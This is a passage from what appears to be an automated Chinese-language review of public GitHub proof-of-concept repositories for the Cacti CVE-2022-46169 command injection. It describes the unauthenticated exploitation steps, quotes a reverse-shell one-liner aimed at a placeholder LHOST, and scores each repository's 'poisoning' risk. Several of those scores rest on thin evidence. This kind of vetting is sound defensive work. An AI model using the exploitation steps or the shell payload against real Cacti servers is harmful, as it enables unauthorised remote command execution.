4.  **代码可读性：** 代码相对清晰，没有明显的恶意行为，但仍然需要仔细审查。

总体来说，PoC代码的投毒风险较低，主要是由于用户输入和执行环境带来的风险。如果代码是从可信来源获取，并且用户仔细审查过代码，那么风险可以忽略不计。

**项目地址:** [ruycr4ft/CVE-2022-46169](https://github.com/ruycr4ft/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #30

**来源**: [CVE-2022-46169-sAsPeCt488_CVE-2022-46169.md](../2022/CVE-2022-46169-sAsPeCt488_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行Cacti，并且存在至少一个`poller_item`，其`action`类型为`POLLER_ACTION_SCRIPT_PHP` (值为2)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵`remote_agent.php`文件中的`poller_id`参数来执行任意操作系统命令。漏洞利用主要分为两个阶段：首先，通过设置`X-Forwarded-For`头绕过身份验证，伪造客户端IP地址，使其与Cacti服务器的IP地址匹配。然后，构造包含恶意命令的`poller_id`参数，并将其发送到`remote_agent.php`，最终导致命令注入。该POC代码通过循环尝试不同的`host_id`来发现可以利用的配置。POC代码没有发现明显的投毒行为，主要目的是利用漏洞执行命令。搜索引擎结果也表明该漏洞已被公开利用。

**项目地址:** [sAsPeCt488/CVE-2022-46169](https://github.com/sAsPeCt488/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #31

**来源**: [CVE-2022-46169-yassinebk_CVE-2022-46169.md](../2022/CVE-2022-46169-yassinebk_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti服务运行且存在特定的数据源配置（poller_item具有POLLER_ACTION_SCRIPT_PHP action）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中的一个未授权命令注入漏洞。攻击者可以利用`remote_agent.php`文件中的授权绕过缺陷，通过伪造HTTP头（例如`X-Forwarded-For`），绕过IP地址验证，并利用`polldata`操作中的`poller_id`参数进行命令注入。

**漏洞利用方式：**

1.  **授权绕过：** 通过设置`X-Forwarded-For` HTTP头，模拟Cacti服务器自身的IP地址，绕过`remote_agent.php`的授权检查。这是因为`get_client_addr`函数信任`HTTP_`开头的`$_SERVER`变量，攻击者可以控制这些变量。
2.  **ID爆破：** 爆破`host_id`和`local_data_id`参数，寻找一个`poller_item`记录，其`action`字段的值为`POLLER_ACTION_SCRIPT_PHP` (值为2)，表明该条目会执行PHP脚本。
3.  **命令注入：** 将恶意命令注入到`poller_id`参数中。由于`get_nfilter_request_var`函数没有充分过滤该参数，导致命令注入。
4.  **远程代码执行：** 通过`proc_open`函数执行注入的命令，从而实现远程代码执行。

**有效性分析：**

根据漏洞描述和提供的POC代码，该漏洞利用方式是有效的。POC代码首先检查目标是否存在漏洞，然后通过爆破`host_id`和`local_data_id`找到合适的`poller_item`记录，最后构造包含恶意命令的URL并发送请求，实现远程代码执行。

**投毒风险分析：**

分析提供的POC代码，没有发现明显的恶意代码或后门。脚本的功能集中于漏洞利用，没有其他可疑操作。因此，投毒风险评估为0%。

**项目地址:** [yassinebk/CVE-2022-46169](https://github.com/yassinebk/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---



---

## POC #8

**来源**: [CVE-2022-46169-MarkStrendin_CVE-2022-46169.md](../2022/CVE-2022-46169-MarkStrendin_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程命令执行

**影响版本:** < 1.2.23

**利用条件:** Cacti服务器运行，且存在具有`POLLER_ACTION_SCRIPT_PHP`动作类型的poller_item，需要网络可达。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过构造特制的 HTTP 请求绕过身份验证，并利用 `remote_agent.php` 文件中的漏洞执行任意系统命令。

**漏洞利用方式：**

1.  **身份验证绕过：** 攻击者可以通过设置 `X-Forwarded-For` 或其他 `HTTP_` 开头的 HTTP Header，伪造客户端IP地址，使其与Cacti服务器自身的IP地址相同。`get_client_addr` 函数会读取这些header，然后 `gethostbyaddr` 函数将伪造的IP解析为主机名。由于 Cacti 的 `poller` 表中默认存在服务器自身的主机名记录，因此绕过身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以向 `remote_agent.php` 发送带有 `action=polldata` 参数的请求，并指定 `host_id`、`local_data_ids[]` 和 `poller_id`。其中，`poller_id` 参数没有经过充分的过滤，攻击者可以在 `poller_id` 中注入恶意命令。
3.  **寻找合适的poller_item：** 为了触发命令注入，需要存在一个 `poller_item`，其 `action` 字段的值为 `POLLER_ACTION_SCRIPT_PHP` (值为2)。

**POC代码分析：**

提供的POC代码是一个 Python 脚本，用于利用 CVE-2022-46169 漏洞。该脚本首先检查目标是否易受攻击，然后暴力破解 `host_id` 和 `local_data_id`，以便找到具有 `POLLER_ACTION_SCRIPT_PHP` 操作的 `poller_item`。 一旦找到，它会构造一个包含恶意负载的 HTTP 请求并发送到 `remote_agent.php`。

**投毒风险分析：**

该代码主要目的是发送payload以获得反向shell，并没有发现恶意修改或删除文件等高危操作。代码的功能基本符合描述，但仍然存在一些潜在风险。

*   **依赖风险：** 代码依赖 `requests` 库，如果 `requests` 库被恶意篡改，可能会导致安全问题。
*   **配置错误：** 攻击者可能会错误配置 `attacker_ip` 和 `attacker_port`，导致攻击失败或暴露自己的IP地址。

根据以上分析，该POC存在较低的投毒风险。 代码的主要功能是利用已知漏洞，没有发现额外的恶意代码或隐藏功能，但也不能完全排除攻击者在实际使用中进行修改以达到其他目的的可能性。 风险评估较低，约为5%。

**结论：**

该漏洞的利用较为直接，POC代码有效。 漏洞存在投毒风险，但风险较低。

**项目地址:** [MarkStrendin/CVE-2022-46169](https://github.com/MarkStrendin/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #9

**来源**: [CVE-2022-46169-N1arut_CVE-2022-46169_POC.md](../2022/CVE-2022-46169-N1arut_CVE-2022-46169_POC.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响的Cacti版本，并且存在`POLLER_ACTION_SCRIPT_PHP`类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵 HTTP 头 `X-Forwarded-For` 绕过身份验证，并利用 `remote_agent.php` 脚本中的漏洞执行任意系统命令。

**漏洞利用方式：**

1.  **身份验证绕过:** 通过设置 `X-Forwarded-For` 头为 Cacti 服务器的 IP 地址，欺骗 `get_client_addr` 函数，绕过身份验证。
2.  **查找可利用的 poller_item:**  通过暴力破解 `host_id` 和 `local_data_id`，找到 `action` 为 `POLLER_ACTION_SCRIPT_PHP` (值为 2)的 `poller_item`。
3.  **命令注入:** 将恶意命令注入到 `poller_id` 参数中，通过 `proc_open` 函数执行。

**POC代码分析：**

*   `cacti_exploit.py` 脚本自动化了漏洞利用过程。
*   首先尝试访问 `/remote_agent.php?action=polldata` 或 `/cacti/remote_agent.php?action=polldata` 来确定正确的URL。
*   然后，脚本使用 `X-Forwarded-For` 头绕过身份验证。
*   接下来，脚本暴力破解 `host_id` 和 `local_data_ids` 来寻找合适的 `poller_item`。
*   最后，脚本构造包含反向 shell 命令的 URL，并发送请求来利用命令注入漏洞。

**有效性：**

根据漏洞描述、搜索结果以及提供的 POC 代码，此漏洞是有效的。搜索结果表明该漏洞已被积极利用。

**投毒风险：**

虽然该脚本的主要目的是利用 CVE-2022-46169 漏洞，但存在轻微的投毒风险。具体体现在：

*   **硬编码参数:** 脚本中存在一些硬编码的参数，例如 `poller_id=1`，`host_id=1`，`local_data_ids[]=1`, `words = ["cpu","cmd.php","polling_time","apache"]`。这些值在不同的 Cacti 部署中可能不同，如果用户不加修改直接使用，可能导致利用失败。这可以被视为一种隐蔽的“陷阱”，虽然不是恶意的后门，但也可能误导用户。
*   **反向Shell Payload:** 用户如果直接使用payload `sh -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1`需要确保目标机器上存在sh.如果没有可能需要更换payload.如果不熟悉的用户可能利用失败.
*   **依赖第三方库:** 脚本依赖 `requests` 和 `urllib3` 库。如果用户从不可信的源安装这些库，可能会引入恶意代码。

尽管如此，该脚本没有发现明显的恶意代码（如删除文件、上传恶意文件等），因此投毒的概率较低，约为5%。主要风险在于使用不当或未能正确配置脚本导致利用失败。


**项目地址:** [N1arut/CVE-2022-46169_POC](https://github.com/N1arut/CVE-2022-46169_POC)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #10

**来源**: [CVE-2022-46169-RdBBB3_SHELL-POC-CVE-2022-46169.md](../2022/CVE-2022-46169-RdBBB3_SHELL-POC-CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti版本低于1.2.23，并且存在action类型为POLLER_ACTION_SCRIPT_PHP的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 中的一个命令注入漏洞。未经身份验证的攻击者可以通过操纵`remote_agent.php`文件中的输入，利用`poller_id`参数执行任意操作系统命令。攻击流程如下：

1.  **身份验证绕过：** 攻击者通过设置`X-Forwarded-For`头绕过身份验证。这是因为`get_client_addr`函数信任`HTTP_`开头的`$_SERVER`变量，允许攻击者伪造客户端IP地址，从而通过`poller`表中的主机名检查。
2.  **触发命令注入：** 绕过身份验证后，攻击者可以调用`remote_agent.php`的`polldata`动作。`poll_for_data`函数检索请求参数并加载相应的`poller_item`条目。如果`poller_item`的`action`等于`POLLER_ACTION_SCRIPT_PHP`，则使用`proc_open`执行PHP脚本。`poller_id`参数在传递给`proc_open`之前未经过充分过滤，从而导致命令注入。
3.  **漏洞利用代码分析：**  `poc.sh` 脚本首先解析用户提供的参数（目标URL、本地IP和端口），然后构造反向shell的payload，并对其进行URL编码。脚本通过发送带有`X-Forwarded-For`头的HTTP请求来检查目标是否易受攻击。该脚本通过暴力破解`host_id`和`local_data_ids`来枚举有效的URL。最后，它使用构造的payload向目标发送一个请求，从而触发反向shell。
4.  **投毒风险评估：**  该POC的主要目的是利用漏洞实现反向Shell。检查`poc.sh`脚本，发现脚本本身主要功能是生成Payload、URL编码、发送HTTP请求。虽然存在修改反向连接IP和端口的可能性，但没有发现明显的恶意代码或后门。`README.md`中建议访问的GitHub仓库 (`https://github.com/m3ssap0/cacti-rce-cve-2022-46169-vulnerable-application`)，用于搭建漏洞环境，**存在一定风险，应该注意**。总体而言，脚本投毒风险较低，初步评估为5%。风险主要来自于下载其他来源的poc，或者使用poc访问陌生的网址。
5.  **有效性评估:** 该POC的有效性较高，因为它可以自动化漏洞利用过程，从身份验证绕过到命令执行。多个搜索引擎结果表明该漏洞已被积极利用。
6.  **利用方式总结：** 通过伪造HTTP头绕过身份验证，然后利用未过滤的`poller_id`参数在`remote_agent.php`中注入命令，最终实现远程代码执行。

**项目地址:** [RdBBB3/SHELL-POC-CVE-2022-46169](https://github.com/RdBBB3/SHELL-POC-CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #11

**来源**: [CVE-2022-46169-Rickster5555_EH2-PoC.md](../2022/CVE-2022-46169-Rickster5555_EH2-PoC.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响版本的Cacti，且存在具有`POLLER_ACTION_SCRIPT_PHP`动作类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti中存在的一个命令注入漏洞，允许未经身份验证的攻击者在服务器上执行任意命令。漏洞存在于`remote_agent.php`文件中，由于对客户端IP地址的验证不严谨，攻击者可以通过设置`X-Forwarded-For`等HTTP头部绕过身份验证。绕过验证后，可以调用`polldata`动作，并利用`poller_id`参数的命令注入漏洞执行系统命令。

**利用方式：**

1.  攻击者发送带有恶意`X-Forwarded-For`头部的HTTP请求到`remote_agent.php`，伪造客户端IP地址，绕过身份验证。
2.  攻击者构造包含命令注入的`poller_id`参数的HTTP请求，发送到`remote_agent.php`，执行任意系统命令。 为了成功利用，必须存在一个`poller_item`，其`action`类型为`POLLER_ACTION_SCRIPT_PHP`（值为2）。

**POC有效性：**

提供的PoC代码通过发送带有特定HTTP头部的GET请求，利用`poller_id`参数执行命令注入。根据漏洞描述和PoC代码，该PoC是有效的，可以用于验证漏洞的存在。

**投毒风险：**

查看提供的文件，包括`README.md`、`cacti-CI-poc.py`、`docker-compose.yml`和`entrypoint.sh`。

*   `README.md`：包含漏洞描述、复现步骤和参考链接，没有发现恶意代码。
*   `cacti-CI-poc.py`：PoC脚本，用于发送HTTP请求触发命令注入，没有发现恶意代码，但利用时执行的命令完全由使用者控制，具有潜在风险。
*   `docker-compose.yml`：Docker Compose配置文件，用于构建包含漏洞版本的Cacti环境，没有发现恶意配置。
*   `entrypoint.sh`：Docker容器的入口脚本，用于初始化Cacti数据库和设置权限，没有发现明显的恶意代码，但其中`mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"`语句禁用了管理员密码强制修改，这可能会降低安全性。

总体来说，该仓库的投毒风险较低，但入口脚本中禁用了管理员密码强制修改，存在潜在的安全风险。

投毒风险评估：5%。

**项目地址:** [Rickster5555/EH2-PoC](https://github.com/Rickster5555/EH2-PoC)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #12

**来源**: [CVE-2022-46169-Safarchand_CVE-2022-46169.md](../2022/CVE-2022-46169-Safarchand_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行受影响版本的Cacti，并且存在具有`POLLER_ACTION_SCRIPT_PHP`操作的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中的一个命令注入漏洞。攻击者可以通过构造`X-Forwarded-For`头绕过身份验证，然后利用`remote_agent.php`中的`polldata`操作注入恶意命令。该POC利用`X-Forwarded-For`头伪造客户端IP，绕过身份验证，然后通过`poller_id`参数向`proc_open`函数传递恶意payload，从而执行任意命令。POC尝试通过暴力破解`host_id`来找到一个可用的`poller_item`。代码中使用了`pexpect`来创建一个交互式的nc会话，以便接收反向shell。虽然使用了base64编码，但这是为了避免命令中的特殊字符导致问题，不是隐藏恶意代码，但是通过nc反弹shell存在被利用进行恶意操作的风险，因此存在一定的投毒风险，但是概率较低。整体而言，POC代码目的是为了验证漏洞存在，因此投毒概率较低，约为10%。

**漏洞利用方式：**

1.  **绕过认证：** 通过设置`X-Forwarded-For`头为Cacti服务器的IP地址，欺骗`get_client_addr`函数，绕过认证。
2.  **触发命令注入：**  向`remote_agent.php`发送包含`polldata` action的请求，并将恶意命令注入到`poller_id`参数中。  利用`proc_open`函数执行注入的命令。
3. **反弹shell:** 该poc通过反弹shell获得服务器控制权。

**项目地址:** [Safarchand/CVE-2022-46169](https://github.com/Safarchand/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #13

**来源**: [CVE-2022-46169-SystemVll_CVE-2022-46169.md](../2022/CVE-2022-46169-SystemVll_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行Cacti，并且存在action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操控HTTP请求头中的`Forwarded-For`字段，绕过身份验证，然后通过`remote_agent.php`文件中的`polldata`操作，并结合一个action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`，将恶意命令注入到`proc_open`函数中执行，从而实现远程代码执行。

**漏洞利用方式:**
1.  **身份验证绕过:** 通过设置`Forwarded-For`等HTTP头，伪造客户端IP地址，绕过`remote_agent.php`的身份验证。
2.  **触发命令注入:**  发送带有恶意`poller_id`参数的请求到`remote_agent.php?action=polldata`，该参数会被插入到`proc_open`函数执行的命令中。
3.  **寻找`POLLER_ACTION_SCRIPT_PHP`:**  漏洞利用的前提是存在一个action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。需要找到对应的`host_id`和`local_data_id`。

**有效性:**
根据漏洞描述，此漏洞利用代码利用了未经授权的远程代理来执行任意系统命令，因此有效。

**投毒风险:**
提供的代码段是 Apache 2.0 许可协议，不包含任何可执行代码或恶意代码，因此投毒风险为0%。核心的PoC代码并没有提供，因此无法判断攻击者是否进行了后门代码验证，只能判断提供的许可协议不存在投毒风险。

**项目地址:** [SystemVll/CVE-2022-46169](https://github.com/SystemVll/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #14

**来源**: [CVE-2022-46169-a1665454764_CVE-2022-46169.md](../2022/CVE-2022-46169-a1665454764_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-远程命令执行

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 远程命令执行

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行Cacti，并且存在具有 'POLLER_ACTION_SCRIPT_PHP' action类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个未经验证的远程命令执行漏洞。攻击者可以通过构造特定的 HTTP 请求，绕过身份验证，并在目标系统上执行任意命令。

**漏洞利用方式：**

1.  **身份验证绕过：** 攻击者通过设置`X-Forwarded-For`等HTTP Header, 伪造客户端 IP 地址，绕过`remote_agent.php`的身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以通过 `polldata` action，并控制 `poller_id` 参数，将恶意命令注入到 `proc_open` 函数的参数中，从而执行任意系统命令。
3.  **前提条件：** 漏洞利用需要存在一个 `poller_item`，其 `action` 字段设置为 `POLLER_ACTION_SCRIPT_PHP` (值为2)。默认安装的Cacti，很可能存在满足此条件的`poller_item`。
4.  **POC有效性:** 提供的POC代码有效, 利用`remote_agent.php`，设置`X-Forwarded-For` header，构造包含恶意命令的URL,发送请求来执行命令。
5. **投毒风险:** README.md 为漏洞复现步骤，以及github仓库的使用方式说明。POC代码本身除了写入output.txt之外没有发现其他恶意行为。虽然存在一定的风险，例如该代码可能被恶意修改后传播，但当前提供的代码投毒概率较低，大约为1%。该POC的主要功能是检测漏洞是否存在并执行命令，而不是植入后门。

**项目地址:** [a1665454764/CVE-2022-46169](https://github.com/a1665454764/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #15

**来源**: [CVE-2022-46169-alv-david_CVE-2022-46169-Cacti-1.2.22.md](../2022/CVE-2022-46169-alv-david_CVE-2022-46169-Cacti-1.2.22.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti服务可网络访问, 并且存在action类型为POLLER_ACTION_SCRIPT_PHP的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti 1.2.23之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过`remote_agent.php`文件，绕过身份验证，然后利用`polldata`动作，通过构造恶意的`poller_id`参数，执行任意操作系统命令。漏洞利用的关键在于：

1.  **身份验证绕过：** 通过设置`X-Forwarded-For`头，伪造客户端IP地址，绕过`remote_agent.php`的身份验证检查。这是因为`get_client_addr`函数会信任`HTTP_`开头的`$_SERVER`变量，导致可以伪造IP地址。
2.  **命令注入：** 一旦通过身份验证，攻击者可以向`remote_agent.php`发送带有`action=polldata`的请求，其中`poller_id`参数可以被注入恶意命令。程序会将这个参数传递给`proc_open`函数，从而执行攻击者提供的命令。
3.  **利用方式：**  提供的Python脚本首先检查目标是否易受攻击，然后使用提供的LHOST和LPORT生成反向shell有效负载。 脚本通过暴力破解`host_id`和`local_data_ids[]`，构造恶意的URL，发送到目标`remote_agent.php`，从而执行反向shell，从而在目标系统上获得shell访问权限。

**投毒风险分析：**

代码本身主要功能是实现漏洞利用，但仍然存在一定低概率的投毒风险：

*   **潜在的后门：** 虽然代码的主要目的是利用漏洞，但作者可能在payload构建过程中插入了额外的恶意代码，例如，在反向shell payload中添加了额外的命令，用于收集敏感信息或执行其他恶意操作。但是从代码来看，payload是根据用户输入的IP和端口构建的，自定义程度较高，因此payload中存在后门的概率较低。
*   **依赖风险：** 该脚本依赖于`requests`和`urllib`库。虽然这些都是常用的库，但如果这些库本身存在漏洞，或者作者使用了不安全的库函数，可能会引入安全风险。

总体而言，该POC代码的投毒风险较低，约为5%。主要风险在于payload构建过程中可能存在的隐蔽后门，以及对第三方库的依赖。

**项目地址:** [alv-david/CVE-2022-46169-Cacti-1.2.22](https://github.com/alv-david/CVE-2022-46169-Cacti-1.2.22)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #16

**来源**: [CVE-2022-46169-antisecc_CVE-2022-46169.md](../2022/CVE-2022-46169-antisecc_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti实例运行，并且存在`poller_item`记录，其`action`类型为`POLLER_ACTION_SCRIPT_PHP` (2)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个未经身份验证的命令注入漏洞。该漏洞位于 `remote_agent.php` 文件中。攻击者可以通过设置 `X-Forwarded-For` HTTP 头绕过身份验证，然后利用 `polldata` 操作，将恶意命令注入到 `poller_id` 参数中，导致服务器执行任意命令。  

**有效性评估：**

根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用的**有效性高**。漏洞库和搜索引擎结果都确认了该漏洞的存在和严重性，并且已经有公开的漏洞利用代码可用。提供的 Python 脚本 `CVE-2022-46169.py` 实现了漏洞利用过程，包括绕过身份验证和注入命令。  

**投毒风险分析：**

对提供的 Python 脚本进行分析，该脚本的主要功能是利用 CVE-2022-46169 漏洞，不存在明显的恶意代码或后门。但是，任何利用代码都存在被修改的风险，攻击者可能会在代码中添加恶意功能。考虑到代码量较少，逻辑清晰，用户可以容易地进行审查，因此，**投毒风险较低，估计为5%**。这个风险主要来自使用者没有进行代码审计就直接使用，例如添加反弹shell等恶意操作。

**利用方式：**

1.  **身份验证绕过：** 攻击者发送带有 `X-Forwarded-For` 头的 HTTP 请求到 `remote_agent.php`，伪造客户端 IP 地址，绕过身份验证。
2.  **命令注入：** 攻击者构造包含恶意命令的 `poller_id` 参数，通过 `polldata` 操作传递给 `remote_agent.php`。
3.  **命令执行：** Cacti 服务器在处理 `polldata` 操作时，会将 `poller_id` 参数中的恶意命令注入到 `proc_open` 函数中，导致服务器执行任意命令。

**POC利用方式详细过程:**

1.  运行 `CVE-2022-46169.py` 脚本，指定目标 Cacti 实例的 URL 和要执行的命令。
2.  脚本会遍历一系列 `host_id`，并为每个 `host_id` 构建一个包含恶意 `poller_id` 参数的 HTTP GET 请求。
3.  脚本设置 `X-Forwarded-For` 头，伪造客户端 IP 地址，绕过身份验证。
4.  脚本发送 HTTP 请求到 `remote_agent.php`。
5.  如果目标 Cacti 实例存在具有 `POLLER_ACTION_SCRIPT_PHP` 操作类型的 `poller_item`，并且成功绕过身份验证，则服务器将执行 `poller_id` 参数中的恶意命令。
6.  脚本会检查响应中是否包含 "proc" 字符串，以确认命令是否已成功执行。
7.  如果命令执行成功，脚本将输出成功的消息，并显示成功利用的 `host_id`。

**项目地址:** [antisecc/CVE-2022-46169](https://github.com/antisecc/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #17

**来源**: [CVE-2022-46169-ariyaadinatha_cacti-cve-2022-46169-exploit.md](../2022/CVE-2022-46169-ariyaadinatha_cacti-cve-2022-46169-exploit.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程命令执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例配置了 action 类型为 POLLER_ACTION_SCRIPT_PHP (2) 的 poller_item，并且需要网络可达。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti 1.2.23之前的版本中的一个命令注入漏洞。该漏洞允许未经身份验证的攻击者在运行Cacti的服务器上执行任意代码。漏洞存在于`remote_agent.php`文件中，该文件可以通过发送特制的HTTP请求进行访问。攻击者可以通过操纵`X-Forwarded-For` header 绕过身份验证,然后通过 `poller_id`参数执行命令注入。PoC代码利用了这一漏洞，首先验证目标是否存在漏洞，然后暴力破解 `host_id`和 `local_data_id`。 一旦这些ID被找到，攻击者就可以构造包含恶意payload的请求，从而在服务器上执行任意命令。

**有效性:**  提供的PoC代码有效，能够成功利用漏洞实现未经身份验证的远程命令执行。

**投毒风险:**  PoC代码主要功能是漏洞利用，并没有发现明显的恶意投毒代码，例如植入后门、篡改数据等。`cacti.py`脚本的主要功能是：
1.  检测目标是否存在漏洞。
2.  爆破 `host_id` 和 `local_data_id`。
3.  执行命令注入。
代码中唯一的潜在风险点是执行命令注入的payload。如果用户在不知情的情况下使用了危险的payload，可能会对系统造成损害，但是这种风险是用户自身行为造成的，并非代码本身存在恶意。

**利用方式:**
1.  攻击者发送包含`X-Forwarded-For` header的HTTP请求到`remote_agent.php`，绕过身份验证。
2.  攻击者通过暴力破解或其它方式获取可用的 `host_id` 和 `local_data_id`，这些ID对应于`poller_item`表中 `action` 字段为 `POLLER_ACTION_SCRIPT_PHP` (2) 的记录。
3.  攻击者构造包含恶意payload的HTTP请求，通过`poller_id`参数进行命令注入，从而在服务器上执行任意命令。

**项目地址:** [ariyaadinatha/cacti-cve-2022-46169-exploit](https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #18

**来源**: [CVE-2022-46169-copyleftdev_PricklyPwn.md](../2022/CVE-2022-46169-copyleftdev_PricklyPwn.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti服务器存在启用了 POLLER_ACTION_SCRIPT_PHP 的 poller_item

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个命令注入漏洞。未经身份验证的攻击者可以通过操纵 HTTP Header (例如 X-Forwarded-For) 绕过身份验证，并向 remote_agent.php 发送特制的请求，注入恶意命令。漏洞的根本原因是 remote_agent.php 文件中的 polldata 操作在处理 poller_id 参数时，没有进行充分的过滤，导致攻击者可以在 proc_open 函数中执行任意命令。提供的漏洞利用代码 (PricklyPwn) 使用 Go 编写，通过爆破 host_id 和 local_data_ids，构造包含恶意命令的 URL，利用该漏洞获取反向 shell。

**有效性分析：**
漏洞利用代码通过 X-Forwarded-For 头绕过认证, 并爆破`host_id`和`local_data_ids`参数，构造恶意 URL 触发命令注入。根据漏洞信息，利用代码应该是有效的。

**投毒风险分析：**
